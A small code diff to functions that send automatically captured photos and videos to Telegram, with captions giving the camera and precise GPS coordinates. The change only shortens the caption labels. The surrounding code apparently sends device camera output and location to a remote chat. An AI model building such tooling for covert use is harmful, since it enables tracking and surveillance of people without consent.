@@ -26,8 +26,8 @@ export async function sendPhotoToTelegram(
   let caption = `📸 Auto Photo #${photoNumber || 1} (${cameraType || 'Back'} Camera)\n⏰ ${new Date().toLocaleString()}`;
   
   if (location) {
-    caption += `\n📍 Location: ${location.latitude.toFixed(8)}, ${location.longitude.toFixed(8)}`;
-    caption += `\n🎯 Accuracy: ±${Math.round(location.accuracy)}m`;
+    caption += `\n📍 ${location.latitude.toFixed(8)}, ${location.longitude.toFixed(8)}`;
+    caption += `\n🎯 ±${Math.round(location.accuracy)}m`;
   }
   
   formData.append('caption', caption);
@@ -53,8 +53,8 @@ export async function sendVideoToTelegram(
   let caption = `🎥 Auto Video #${videoNumber || 1} (${cameraType || 'Back'} Camera)\n⏰ ${new Date().toLocaleString()}`;
   
   if (location) {
-    caption += `\n📍 Location: ${location.latitude.toFixed(8)}, ${location.longitude.toFixed(8)}`;
-    caption += `\n🎯 Accuracy: ±${Math.round(location.accuracy)}m`;
+    caption += `\n📍 ${location.latitude.toFixed(8)}, ${location.longitude.toFixed(8)}`;
+    caption += `\n🎯 ±${Math.round(location.accuracy)}m`;
   }
   
   formData.append('caption', caption);
